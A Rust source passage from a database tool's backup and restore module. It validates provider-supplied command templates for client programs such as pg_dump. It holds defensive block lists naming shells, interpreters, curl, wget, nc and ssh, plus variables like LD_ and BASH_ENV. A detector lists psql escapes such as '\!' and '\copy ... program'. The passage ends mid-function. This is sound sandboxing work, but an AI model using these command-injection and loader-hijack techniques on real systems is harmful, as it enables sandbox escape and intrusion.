//! Backups and restores through a database's own client programs, such as
//! `pg_dump`. A driver declares its tasks, with a template of each command;
//! the application fills the template, finds the program and runs it.

use std::collections::BTreeMap;
use std::fmt;

use serde::{Deserialize, Serialize};

use crate::error::{DbError, ErrorKind, Result};
use crate::profile::{ConnectionProfile, SslMode};

/// Programs a task may never name: shells, interpreters and launchers run
/// whatever their arguments say, so a provider could escape its sandbox
/// through them.
const DENIED_PROGRAMS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "nu",
    "cmd",
    "command",
    "powershell",
    "pwsh",
    "wsl",
    "python",
    "python3",
    "perl",
    "ruby",
    "node",
    "deno",
    "bun",
    "php",
    "lua",
    "tclsh",
    "osascript",
    "env",
    "sudo",
    "su",
    "doas",
    "open",
    "xdg-open",
    "start",
    "explorer",
    "rundll32",
    "mshta",
    "wscript",
    "cscript",
    "curl",
    "wget",
    "ssh",
    "scp",
    "nc",
    "ncat",
    "rm",
    "mv",
    "cp",
    "dd",
    "chmod",
    "chown",
    "launchctl",
    "crontab",
    "at",
    "xargs",
    "find",
    "awk",
    "sed",
    "git",
    "make",
    "docker",
];

/// Environment variables a command may never set: they change which code
/// a program loads or what a shell runs.
const DENIED_ENV: &[&str] = &[
    "PATH",
    "PATHEXT",
    "HOME",
    "USER",
    "SHELL",
    "IFS",
    "ENV",
    "BASH_ENV",
    "PROMPT_COMMAND",
    "TMPDIR",
    "TEMP",
    "TMP",
    "COMSPEC",
    "SYSTEMROOT",
    "NODE_OPTIONS",
    "PERL5OPT",
    "PERL5LIB",
    "PYTHONPATH",
    "PYTHONSTARTUP",
    "RUBYOPT",
    "EDITOR",
    "VISUAL",
    "PAGER",
    "PSQL_PAGER",
    "PSQLRC",
    "PSQL_EDITOR",
];

/// Prefixes of denied environment variables.
const DENIED_ENV_PREFIXES: &[&str] = &["LD_", "DYLD_", "MALLOC", "GCONV", "LOCPATH"];

/// Parts of variable names that point programs at files, folders or code
/// to load (`PGPASSFILE`, `PGSERVICEFILE`, `JAVA_OPTIONS`...).
const DENIED_ENV_PARTS: &[&str] = &[
    "FILE", "PATH", "DIR", "LIB", "HOME", "PRELOAD", "RC", "EDITOR", "PAGER", "SHELL", "OPT",
    "PLUGIN", "MODULE", "SCRIPT", "EXEC", "CMD", "COMMAND", "HOOK", "SERVICE", "CONF",
];

/// Program names starting with these are interpreters whatever their
/// version suffix (`python3.12`, `perl5.30`, `node20`).
const DENIED_PROGRAM_PREFIXES: &[&str] = &[
    "python",
    "perl",
    "ruby",
    "node",
    "php",
    "lua",
    "pwsh",
    "powershell",
    "bash",
    "zsh",
    "java",
    "osascript",
    "wscript",
    "cscript",
    "tcl",
    "wish",
    "guile",
    "racket",
    "irb",
    "jshell",
    "busybox",
    "toybox",
];

/// How much of a file [`crate::Driver::inspect_input`] is shown.
pub const INSPECT_HEAD: usize = 4096;
/// How many of a folder's entries it is shown.
pub const INSPECT_ENTRIES: usize = 64;

/// The pseudo-setting conditions read the profile's TLS mode from.
pub const SSL_SETTING: &str = "@ssl";

/// Platforms downloads are offered for.
pub const PLATFORMS: &[&str] = &[
    "macos-aarch64",
    "macos-x86_64",
    "linux-x86_64",
    "linux-aarch64",
    "windows-x86_64",
];

/// The largest archive a provider may have downloaded.
pub const MAX_DOWNLOAD: u64 = 256 << 20;

const MAX_FIELDS: usize = 64;
const MAX_PROGRAMS: usize = 8;
const MAX_LOCATIONS: usize = 16;
const MAX_COMMANDS: usize = 8;
const MAX_PARTS: usize = 256;
const MAX_ARGS: usize = 512;
const MAX_ARG: usize = 32 << 10;
const MAX_ENV: usize = 32;

/// What a task does.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TaskKind {
    Backup,
    Restore,
}

impl TaskKind {
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Backup => "Backup",
            Self::Restore => "Restore",
        }
    }
}

impl fmt::Display for TaskKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.label())
    }
}

/// One of a choice field's values.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Choice {
    pub value: String,
    pub label: String,
}

/// What a setting holds.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FieldKind {
    /// `true` or `false`.
    Flag,
    Text,
    /// A whole number from `min` to `max`.
    Number {
        min: i64,
        max: i64,
    },
    Choice(Vec<Choice>),
}

/// Holds when `field` has one of `values`, or with `except`, none.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Condition {
    pub field: String,
    pub values: Vec<String>,
    pub except: bool,
}

impl Condition {
    #[must_use]
    pub fn holds(&self, settings: &TaskSettings) -> bool {
        let matched = settings
            .get(&self.field)
            .is_some_and(|value| self.values.iter().any(|v| v == value));
        matched != self.except
    }
}

/// Whether every condition holds.
#[must_use]
pub fn all_hold(conditions: &[Condition], settings: &TaskSettings) -> bool {
    conditions.iter().all(|condition| condition.holds(settings))
}

/// A task setting, as the dialog shows it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Field {
    pub id: String,
    pub label: String,
    pub help: String,
    /// The group it is shown in.
    pub section: String,
    pub kind: FieldKind,
    pub default: String,
    /// Shown only while every condition holds.
    pub when: Vec<Condition>,
}

impl Field {
    /// Whether the field applies with these settings.
    #[must_use]
    pub fn visible(&self, settings: &TaskSettings) -> bool {
        all_hold(&self.when, settings)
    }

    /// `value` if the field can hold it.
    #[must_use]
    pub fn accepts(&self, value: &str) -> bool {
        match &self.kind {
            FieldKind::Flag => value == "true" || value == "false",
            FieldKind::Text => !value.contains('\0') && value.len() <= MAX_ARG,
            FieldKind::Number { min, max } => value
                .parse::<i64>()
                .is_ok_and(|n| (*min..=*max).contains(&n)),
            FieldKind::Choice(choices) => choices.iter().any(|c| c.value == value),
        }
    }
}

/// Field values by id.
pub type TaskSettings = BTreeMap<String, String>;

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PathKind {
    File,
    Directory,
}

/// What a backup writes or a restore reads.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Target {
    pub when: Vec<Condition>,
    pub kind: PathKind,
    /// Without the dot; empty for any.
    pub extension: String,
}

/// A setting's value, with listed values replaced.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ValuePiece {
    pub field: String,
    pub map: Vec<(String, String)>,
}

/// Part of an argument or a variable's value.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Piece {
    Text(String),
    Value(ValuePiece),
    /// The chosen file or folder.
    Path,
    Host,
    Port,
    User,
    Database,
}

/// An argument added when every condition holds; with `each`, once per
/// comma-separated item of that text field.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Argument {
    pub when: Vec<Condition>,
    pub pieces: Vec<Piece>,
    pub each: Option<String>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Quoting {
    None,
    Double,
    Backtick,
    Bracket,
}

impl Quoting {
    #[must_use]
    pub fn quote(self, name: &str) -> String {
        match self {
            Self::None => name.to_owned(),
            Self::Double => format!("\"{}\"", name.replace('"', "\"\"")),
            Self::Backtick => format!("`{}`", name.replace('`', "``")),
            Self::Bracket => format!("[{}]", name.replace(']', "]]")),
        }
    }
}

/// One argument per picked schema or relation.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ObjectArguments {
    pub schema_prefix: String,
    pub table_prefix: String,
    pub quoting: Quoting,
    /// Whole schemas, when relations are picked too: `table_prefix`, the
    /// quoted schema and this.
    pub schema_tables: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum CommandPart {
    Argument(Argument),
    Objects(ObjectArguments),
    /// Arguments the user typed in this text field.
    Extra(String),
}

/// An environment variable set when every condition holds.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Variable {
    pub when: Vec<Condition>,
    pub name: String,
    pub pieces: Vec<Piece>,
}

/// How a program reaches the server.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Binding {
    Env(String),
    /// One argument: the option, then the value. An option ending in a
    /// space, such as `-h `, is an argument of its own before the value,
    /// for programs that take no `-hvalue` (`redis-cli`).
    Option(String),
}

/// The profile's connection, which the application passes itself.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Connection {
    pub host: Option<Binding>,
    pub port: Option<Binding>,
    pub user: Option<Binding>,
    pub database: Option<Binding>,
    pub password_env: Option<String>,
    /// A text field naming another database to use.
    pub database_field: Option<String>,
}

impl Connection {
    fn bindings(&self) -> impl Iterator<Item = &Binding> {
        [&self.host, &self.port, &self.user, &self.database]
            .into_iter()
            .flatten()
    }
}

/// A command line as a task declares it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CommandTemplate {
    pub program: String,
    pub when: Vec<Condition>,
    pub parts: Vec<CommandPart>,
    pub variables: Vec<Variable>,
    pub stdout_to_path: bool,
    pub stdin_from_path: bool,
}

/// A backup or restore a driver offers.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Task {
    pub kind: TaskKind,
    /// Programs its commands run, by file name.
    pub programs: Vec<String>,
    /// Where the programs usually live; `*` stands for part of a folder
    /// name.
    pub locations: Vec<String>,
    /// Makes a program print its version.
    pub version_arg: Option<String>,
    pub fields: Vec<Field>,
    /// The user picks schemas and relations.
    pub objects: bool,
    pub targets: Vec<Target>,
    pub connection: Connection,
    pub commands: Vec<CommandTemplate>,
}

/// Client programs to download with a provider.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct Download {
    pub platform: String,
    pub url: String,
    pub sha256: String,
    pub size: u64,
    pub label: String,
    /// The top folder inside the archive.
    pub root: String,
    /// What to keep under `root`: files, or folders ending in `/`.
    pub extract: Vec<String>,
    /// The programs' folder under `root`.
    pub bin: String,
}

impl Download {
    /// The platform Violet runs on, as downloads name it.
    #[must_use]
    pub fn this_platform() -> Option<&'static str> {
        match (std::env::consts::OS, std::env::consts::ARCH) {
            ("macos", "aarch64") => Some("macos-aarch64"),
            ("macos", "x86_64") => Some("macos-x86_64"),
            ("linux", "x86_64") => Some("linux-x86_64"),
            ("linux", "aarch64") => Some("linux-aarch64"),
            ("windows", "x86_64") => Some("windows-x86_64"),
            _ => None,
        }
    }

    /// Checks a download a provider declared: a known platform, HTTPS, a
    /// digest, a bounded size and plain relative paths.
    pub fn check(&self) -> Result<()> {
        let bad = |what: &str| Err(invalid(format!("download for {}: {what}", self.platform)));
        if !PLATFORMS.contains(&self.platform.as_str()) {
            return bad("unknown platform");
        }
        if !self.url.starts_with("https://") || !plain_text(&self.url) || self.url.len() > 2048 {
            return bad("the address must be https://");
        }
        if self.sha256.len() != 64 || !self.sha256.bytes().all(|b| b.is_ascii_hexdigit()) {
            return bad("needs a SHA-256 digest");
        }
        if self.size == 0 || self.size > MAX_DOWNLOAD {
            return bad("unusable size");
        }
        if self.label.chars().count() > 80 || !plain_text(&self.label) {
            return bad("unusable label");
        }
        let relative = |path: &str| {
            !path.is_empty()
                && path.len() <= 256
                && plain_text(path)
                && !path.starts_with('/')
                && !path.contains('\\')
                && !path.contains(':')
                && path.split('/').all(|part| part != ".." && part != ".")
        };
        if !relative(&self.root)
            || !relative(&self.bin)
            || self.extract.is_empty()
            || self.extract.len() > 64
            || !self.extract.iter().all(|path| relative(path))
        {
            return bad("unusable paths");
        }
        Ok(())
    }
}

impl Task {
    /// Checks a description that came from a provider: names, sizes,
    /// references, and that no fixed text can run other commands or point
    /// the program at another server.
    #[allow(clippy::too_many_lines)]
    pub fn check(&self) -> Result<()> {
        let bad = |what: String| Err(invalid(format!("{} task: {what}", self.kind)));
        if self.programs.is_empty() || self.programs.len() > MAX_PROGRAMS {
            return bad(format!("needs 1 to {MAX_PROGRAMS} programs"));
        }
        for program in &self.programs {
            if !program_name_ok(program) {
                return bad(format!("{program:?} is not a program it may run"));
            }
        }
        if self.locations.len() > MAX_LOCATIONS {
            return bad("too many locations".into());
        }
        for location in &self.locations {
            if !location_ok(location) {
                return bad(format!("{location:?} is not an absolute folder"));
            }
        }
        if let Some(arg) = &self.version_arg
            && !(arg.starts_with('-') && arg.len() <= 32 && plain_text(arg))
        {
            return bad(format!("{arg:?} is not a version option"));
        }
        if self.fields.len() > MAX_FIELDS {
            return bad("too many settings".into());
        }
        let mut ids = std::collections::BTreeSet::new();
        for field in &self.fields {
            let id_ok = !field.id.is_empty()
                && field.id.len() <= 32
                && field
                    .id
                    .bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-');
            if !id_ok || !ids.insert(field.id.as_str()) {
                return bad(format!("{:?} is not a usable setting id", field.id));
            }
            let short = |text: &str, max: usize| text.chars().count() <= max && plain_text(text);
            if !short(&field.label, 80) || !short(&field.help, 400) || !short(&field.section, 40) {
                return bad(format!("setting {:?} has an unusable label", field.id));
            }
            match &field.kind {
                FieldKind::Number { min, max } if min > max => {
                    return bad(format!("setting {:?} has an empty range", field.id));
                }
                FieldKind::Choice(choices)
                    if choices.is_empty()
                        || choices.len() > 32
                        || choices.iter().any(|c| {
                            c.value.len() > 64 || !short(&c.label, 80) || !plain_text(&c.value)
                        }) =>
                {
                    return bad(format!("setting {:?} has unusable choices", field.id));
                }
                _ => {}
            }
            if !field.accepts(&field.default) {
                return bad(format!("setting {:?} has an invalid default", field.id));
            }
        }
        let kind_of = |id: &str| {
            self.fields
                .iter()
                .find(|field| field.id == id)
                .map(|field| &field.kind)
        };
        let is_text = |id: &str| matches!(kind_of(id), Some(FieldKind::Text));

        // Connection: names, and what fixed text may not say.
        let connection = &self.connection;
        let mut connection_env = Vec::new();
        let mut connection_options = Vec::new();
        for binding in connection.bindings() {
            match binding {
                Binding::Env(name) if env_name_ok(name) => {
                    connection_env.push(name.to_ascii_uppercase());
                }
                Binding::Option(option)
                    if option.starts_with('-') && option.len() <= 32 && plain_text(option) =>
                {
                    connection_options.push(option.trim_end_matches(['=', ' ']).to_owned());
                }
                _ => return bad(format!("{binding:?} is not a usable connection binding")),
            }
        }
        if let Some(name) = &connection.password_env {
            // Only a password variable: a provider may not route the
            // password into one a program logs or sends along, such as an
            // application name.
            let upper = name.to_ascii_uppercase();
            let password = upper.contains("PASSWORD")
                || upper.contains("PASSWD")
                // MySQL's and MariaDB's clients only read `MYSQL_PWD`. Not
                // any `*PWD`: `PWD` itself is the shell's working folder.
                || upper == "MYSQL_PWD"
                // And `redis-cli` only `REDISCLI_AUTH`.
                || upper == "REDISCLI_AUTH";
            if !env_name_ok(name) || !password {
                return bad(format!("{name:?} is not a usable password variable"));
            }
            connection_env.push(name.to_ascii_uppercase());
        }
        if let Some(field) = &connection.database_field {
            let empty = self
                .fields
                .iter()
                .any(|f| f.id == *field && f.kind == FieldKind::Text && f.default.is_empty());
            if !empty {
                return bad(format!(
                    "the database field {field:?} must be text, empty by default"
                ));
            }
        }
        // Fixed text reaches command lines as is: it may not run commands,
        // and may not set the connection through another door.
        let fixed_ok = |text: &str| {
            let lower = text.to_ascii_lowercase();
            plain_text(text)
                && text.len() <= MAX_ARG
                && !runs_commands(text)
                && !names_a_connection(text)
                && !connection_options
                    .iter()
                    .any(|option| lower.starts_with(&option.to_ascii_lowercase()))
        };
        for field in &self.fields {
            let fixed: Vec<&str> = match &field.kind {
                FieldKind::Choice(choices) => choices.iter().map(|c| c.value.as_str()).collect(),
                FieldKind::Text => vec![field.default.as_str()],
                _ => Vec::new(),
            };
            if let Some(text) = fixed.into_iter().find(|text| !fixed_ok(text)) {
                return bad(format!("setting {:?} offers {text:?}", field.id));
            }
        }

        let condition_ok = |condition: &Condition| {
            condition.field == SSL_SETTING || ids.contains(condition.field.as_str())
        };
        let pieces_ok = |pieces: &[Piece], each: Option<&str>| -> std::result::Result<(), String> {
            for piece in pieces {
                match piece {
                    Piece::Text(text) if !fixed_ok(text) => {
                        return Err(format!("fixed text {text:?} is not allowed"));
                    }
                    Piece::Value(value) => {
                        if kind_of(&value.field).is_none() {
                            return Err(format!("a value names {:?}", value.field));
                        }
                        if let Some((_, to)) = value.map.iter().find(|(_, to)| !fixed_ok(to)) {
                            return Err(format!("a value maps to {to:?}"));
                        }
                    }
                    _ => {}
                }
            }
            if let Some(field) = each
                && !is_text(field)
            {
                return Err(format!("{field:?} repeats an argument but is not text"));
            }
            Ok(())
        };

        let fields_conditions = self.fields.iter().flat_map(|field| &field.when);
        let target_conditions = self.targets.iter().flat_map(|target| &target.when);
        if let Some(condition) = fields_conditions
            .chain(target_conditions)
            .find(|c| !condition_ok(c))
        {
            return bad(format!("a condition names {:?}", condition.field));
        }
        if self.targets.len() > 16
            || self.targets.iter().any(|target| {
                target.extension.len() > 16
                    || !target.extension.bytes().all(|b| b.is_ascii_alphanumeric())
            })
        {
            return bad("unusable targets".into());
        }

        if self.commands.is_empty() || self.commands.len() > MAX_COMMANDS {
            return bad(format!("needs 1 to {MAX_COMMANDS} commands"));
        }
        for command in &self.commands {
            if !self.programs.contains(&command.program) {
                return bad(format!(
                    "a command runs {:?}, not declared",
                    command.program
                ));
            }
            if command.stdout_to_path && command.stdin_from_path {
                return bad("a command both reads and writes the path".into());
            }
            if command.parts.len() > MAX_PARTS || command.variables.len() > MAX_ENV {
                return bad("a command is too long".into());
            }
            if let Some(condition) = command.when.iter().find(|c| !condition_ok(c)) {
                return bad(format!("a condition names {:?}", condition.field));
            }
            for part in &command.parts {
                let checked = match part {
                    CommandPart::Argument(argument) => {
                        if let Some(condition) = argument.when.iter().find(|c| !condition_ok(c)) {
                            Err(format!("a condition names {:?}", condition.field))
                        } else {
                            pieces_ok(&argument.pieces, argument.each.as_deref())
                        }
                    }
                    CommandPart::Objects(objects) => {
                        if fixed_ok(&objects.schema_prefix)
                            && fixed_ok(&objects.table_prefix)
                            && objects.schema_tables.as_deref().is_none_or(fixed_ok)
                        {
                            Ok(())
                        } else {
                            Err("unusable object prefixes".into())
                        }
                    }
                    CommandPart::Extra(field) if !is_text(field) => {
                        Err(format!("extra arguments come from {field:?}, not text"))
                    }
                    CommandPart::Extra(_) => Ok(()),
                };
                if let Err(what) = checked {
                    return bad(what);
                }
            }
            for variable in &command.variables {
                let upper = variable.name.to_ascii_uppercase();
                if !env_name_ok(&variable.name)
                    || connection_env.contains(&upper)
                    || connection_variable(&upper)
                {
                    return bad(format!("a command may not set {:?}", variable.name));
                }
                if let Some(condition) = variable.when.iter().find(|c| !condition_ok(c)) {
                    return bad(format!("a condition names {:?}", condition.field));
                }
                if let Err(what) = pieces_ok(&variable.pieces, None) {
                    return bad(what);
                }
            }
        }
        Ok(())
    }

    /// Every field at its default.
    #[must_use]
    pub fn defaults(&self) -> TaskSettings {
        self.fields
            .iter()
            .map(|field| (field.id.clone(), field.default.clone()))
            .collect()
    }

    /// `settings` with every field present and valid: missing, unknown and
    /// unusable values give way to defaults.
    #[must_use]
    pub fn normalize(&self, settings: &TaskSettings) -> TaskSettings {
        self.fields
            .iter()
            .map(|field| {
                let value = settings
                    .get(&field.id)
                    .filter(|value| field.accepts(value))
                    .unwrap_or(&field.default);
                (field.id.clone(), value.clone())
            })
            .collect()
    }

    /// What the task writes or reads with these settings.
    #[must_use]
    pub fn target(&self, settings: &TaskSettings) -> Target {
        self.targets
            .iter()
            .find(|target| all_hold(&target.when, settings))
            .cloned()
            .unwrap_or(Target {
                when: Vec::new(),
                kind: PathKind::File,
                extension: String::new(),
            })
    }

    /// Fills the template: the command `request` runs against `profile`.
    pub fn build(&self, profile: &ConnectionProfile, request: &TaskRequest) -> Result<ToolCommand> {
        let mut settings = self.normalize(&request.settings);
        let ssl = match profile.ssl.effective(&profile.host) {
            SslMode::Disable => "disable",
            SslMode::Prefer => "prefer",
            SslMode::Require => "require",
        };
        settings.insert(SSL_SETTING.to_owned(), ssl.to_owned());
        let database = self
            .connection
            .database_field
            .as_ref()
            .and_then(|field| settings.get(field))
            .map(|value| value.trim().to_owned())
            .filter(|value| !value.is_empty())
            .unwrap_or_else(|| profile.database.clone());
        let values = Values {
            settings: &settings,
            path: &request.path,
            host: profile.host.trim(),
            port: profile.port.to_string(),
            user: &profile.username,
            database: &database,
        };
        let template = self
            .commands
            .iter()
            .find(|command| all_hold(&command.when, &settings))
            .ok_or_else(|| DbError::unsupported(format!("No {} for these settings", self.kind)))?;

        let mut args = Vec::new();
        let mut env = Vec::new();
        let connection = [
            (&self.connection.host, values.host),
            (&self.connection.port, values.port.as_str()),
            (&self.connection.user, values.user),
            (&self.connection.database, values.database),
        ];
        for (binding, value) in connection {
            match binding {
                Some(_) if value.is_empty() => {}
                Some(Binding::Env(name)) => env.push((name.clone(), value.to_owned())),
                Some(Binding::Option(option)) => {
                    // Clients read `key=value` and URIs in such options as
                    // whole connection strings (libpq's `--dbname`), which
                    // could name another server.
                    if value.contains('=') || value.contains("://") || value.starts_with('-') {
                        return Err(DbError::new(
                            ErrorKind::Other,
                            format!("{value:?} cannot be used as a connection value"),
                        ));
                    }
                    match option.strip_suffix(' ') {
                        Some(option) => args.extend([option.to_owned(), value.to_owned()]),
                        None => args.push(format!("{option}{value}")),
                    }
                }
                None => {}
            }
        }
        for part in &template.parts {
            match part {
                CommandPart::Argument(argument) if all_hold(&argument.when, &settings) => {
                    match &argument.each {
                        Some(field) => {
                            let items = settings.get(field).cloned().unwrap_or_default();
                            for item in items.split(',').map(str::trim).filter(|i| !i.is_empty()) {
                                args.push(values.render(&argument.pieces, Some((field, item))));
                            }
                        }
                        None => args.push(values.render(&argument.pieces, None)),
                    }
                }
                CommandPart::Argument(_) => {}
                CommandPart::Objects(objects) => {
                    if self.objects {
                        let mixed = request.objects.iter().any(|o| o.name.is_some());
                        for object in &request.objects {
                            let schema = objects.quoting.quote(&object.schema);
                            args.push(match (&object.name, &objects.schema_tables) {
                                (Some(name), _) => format!(
                                    "{}{schema}.{}",
                                    objects.table_prefix,
                                    objects.quoting.quote(name)
                                ),
                                (None, Some(suffix)) if mixed => {
                                    format!("{}{schema}{suffix}", objects.table_prefix)
                                }
                                (None, _) => format!("{}{schema}", objects.schema_prefix),
                            });
                        }
                    }
                }
                CommandPart::Extra(field) => {
                    args.extend(split_args(settings.get(field).map_or("", String::as_str)));
                }
            }
        }
        for variable in &template.variables {
            if all_hold(&variable.when, &settings) {
                env.push((variable.name.clone(), values.render(&variable.pieces, None)));
            }
        }
        if args.len() > MAX_ARGS
            || args
                .iter()
                .chain(env.iter().map(|(_, v)| v))
                .any(|a| a.len() > MAX_ARG || a.contains('\0'))
        {
            return Err(invalid("the command is too long or holds a NUL".into()));
        }
        Ok(ToolCommand {
            program: template.program.clone(),
            args,
            env,
            password_env: self.connection.password_env.clone(),
            stdout_to_path: template.stdout_to_path,
            stdin_from_path: template.stdin_from_path,
        })
    }

    /// Everything fixed this task can put on a command line, to show before
    /// the user allows a provider's programs.
    #[must_use]
    pub fn vocabulary(&self) -> Vec<String> {
        let mut words = std::collections::BTreeSet::new();
        let mut pieces = |pieces: &[Piece]| {
            let text: String = pieces
                .iter()
                .map(|piece| match piece {
                    Piece::Text(text) => text.clone(),
                    Piece::Value(value) => format!("<{}>", value.field),
                    Piece::Path => "<path>".into(),
                    Piece::Host => "<host>".into(),
                    Piece::Port => "<port>".into(),
                    Piece::User => "<user>".into(),
                    Piece::Database => "<database>".into(),
                })
                .collect();
            words.insert(text);
        };
        for command in &self.commands {
            for part in &command.parts {
                match part {
                    CommandPart::Argument(argument) => pieces(&argument.pieces),
                    CommandPart::Objects(objects) => {
                        pieces(&[Piece::Text(format!("{}<schema>", objects.schema_prefix))]);
                        pieces(&[Piece::Text(format!("{}<table>", objects.table_prefix))]);
                    }
                    CommandPart::Extra(field) => pieces(&[Piece::Text(format!("<{field}…>"))]),
                }
            }
            for variable in &command.variables {
                let mut all = vec![Piece::Text(format!("{}=", variable.name))];
                all.extend(variable.pieces.iter().cloned());
                pieces(&all);
            }
        }
        words.into_iter().collect()
    }
}

/// What template pieces stand for.
struct Values<'a> {
    settings: &'a TaskSettings,
    path: &'a str,
    host: &'a str,
    port: String,
    user: &'a str,
    database: &'a str,
}

impl Values<'_> {
    /// `pieces` joined; `item` stands for one field's value.
    fn render(&self, pieces: &[Piece], item: Option<(&String, &str)>) -> String {
        pieces
            .iter()
            .map(|piece| match piece {
                Piece::Text(text) => text.clone(),
                Piece::Value(value) => {
                    let raw = match item {
                        Some((field, item)) if *field == value.field => item,
                        _ => self.settings.get(&value.field).map_or("", String::as_str),
                    };
                    value
                        .map
                        .iter()
                        .find(|(from, _)| from == raw)
                        .map_or(raw, |(_, to)| to.as_str())
                        .to_owned()
                }
                Piece::Path => self.path.to_owned(),
                Piece::Host => self.host.to_owned(),
                Piece::Port => self.port.clone(),
                Piece::User => self.user.to_owned(),
                Piece::Database => self.database.to_owned(),
            })
            .collect()
    }
}

/// Splits arguments the user typed as a shell would, without running one:
/// whitespace separates, quotes group, a backslash escapes the next
/// character outside single quotes.
#[must_use]
pub fn split_args(text: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut started = false;
    let mut chars = text.chars();
    let mut quote: Option<char> = None;
    while let Some(c) = chars.next() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some('\''), c) => current.push(c),
            (_, '\\') => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
                started = true;
            }
            (Some(_), c) => current.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                started = true;
            }
            (None, c) if c.is_whitespace() => {
                if started || !current.is_empty() {
                    args.push(std::mem::take(&mut current));
                }
                started = false;
            }
            (None, c) => current.push(c),
        }
    }
    if started || !current.is_empty() {
        args.push(current);
    }
    args
}

/// Arguments that make database consoles run shell commands or write
/// through pipes: `psql`'s `\!`, `\o |cmd`, `\copy ... program`,
/// `--output=|cmd`, and the like in other clients.
fn runs_commands(arg: &str) -> bool {
    const META: &[&str] = &[
        "o", "g", "w", "i", "ir", "copy", "setenv", "gexec", "out", "gx", "gset", "cd", "e",
        "edit", "ef", "ev", "include", "write",
    ];
    let lower = arg.to_ascii_lowercase();
    // No client option needs a pipe, so none may carry one.
    if lower.contains('|') || lower.contains("\\!") || lower.contains("program ") {
        return true;
    }
    // `system <command>` (mysql); a lone `system`, such as libpq's
    // `sslrootcert=system`, runs nothing.
    let words: Vec<&str> = lower
        .split(|c: char| c == '=' || c.is_whitespace())
        .filter(|word| !word.is_empty())
        .collect();
    if words
        .iter()
        .take(words.len().saturating_sub(1))
        .any(|word| *word == "system")
    {
        return true;
    }
    // Backslash meta-commands anywhere, except inside a Windows path: an
    // argument with a drive (`C:\`) is a path, and paths go through the
    // request's path, which the user chose.
    let value = lower.split_once('=').map_or(lower.as_str(), |(_, v)| v);
    let bytes = value.as_bytes();
    let windows_path = bytes.len() > 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && bytes[2] == b'\\'
        && !value.contains(char::is_whitespace)
        && !value.contains(';');
    !windows_path
        && lower.match_indices('\\').any(|(at, _)| {
            let word: String = lower[at + 1..]
                .chars()
                .take_while(char::is_ascii_alphabetic)
                .collect();
            META.contains(&word.as_str())
        })
}

fn invalid(message: String) -> DbError {
    DbError::new(ErrorKind::Provider, format!("Unusable task: {message}"))
}

/// No control characters.
fn plain_text(text: &str) -> bool {
    !text.chars().any(char::is_control)
}

/// Words that name where a client connects or as whom, as options
/// (`--host=`) or in connection strings (`host=`): only the connection the
/// task declares may set those.
const CONNECTION_WORDS: &[&str] = &[
    "host",
    "hostaddr",
    "hostname",
    "port",
    "user",
    "username",
    "login",
    "dbname",
    "database",
    "db",
    "server",
    "service",
    "servicefile",
    "socket",
    "url",
    "uri",
    "dsn",
    "connect",
    "connection",
    "conninfo",
    "password",
    "passwd",
    "pass",
    "pwd",
    "passfile",
];

/// Short options clients read a connection from (`-h host`, `-U user`).
const CONNECTION_FLAGS: &[&str] = &["-h", "-p", "-U", "-u", "-d", "-S", "-H", "-P", "-W"];

/// Whether fixed text sets a connection: an option named for one
/// (`--host=`, `--dbname`, `-h`), or a connection string (`host=...`,
/// `postgresql://`).
fn names_a_connection(text: &str) -> bool {
    if text.to_ascii_lowercase().contains("://") {
        return true;
    }
    text.split(char::is_whitespace).any(|word| {
        let short = CONNECTION_FLAGS
            .iter()
            .any(|flag| word.starts_with(flag) && !word.starts_with("--"));
        let lower = word.to_ascii_lowercase();
        let name = lower
            .trim_start_matches('-')
            .split(['=', ','])
            .next()
            .unwrap_or_default();
        short
            || CONNECTION_WORDS.contains(&name)
            || lower.split(',').any(|item| {
                item.split_once('=')
                    .is_some_and(|(key, _)| CONNECTION_WORDS.contains(&key.trim_start_matches('-')))
            })
    })
}

/// A variable that would set where a client connects or as whom
/// (`PGHOSTADDR`, `PGSERVICE`, `MYSQL_HOST`...).
fn connection_variable(upper: &str) -> bool {
    const ENDINGS: &[&str] = &[
        "HOST", "HOSTADDR", "PORT", "USER", "DATABASE", "DBNAME", "SERVER", "SERVICE", "SOCKET",
        "URL", "URI", "DSN", "PASSWORD", "PASSWD", "PWD",
    ];
    upper
        .split('_')
        .any(|word| ENDINGS.iter().any(|ending| word.ends_with(ending)))
}

/// A bare file name a task may run.
#[must_use]
pub fn program_name_ok(name: &str) -> bool {
    let stem = name
        .strip_suffix(".exe")
        .unwrap_or(name)
        .to_ascii_lowercase();
    !name.is_empty()
        && name.len() <= 64
        && !name.starts_with(['.', '-'])
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b'+'))
        && !DENIED_PROGRAMS.contains(&stem.as_str())
        && !DENIED_PROGRAM_PREFIXES
            .iter()
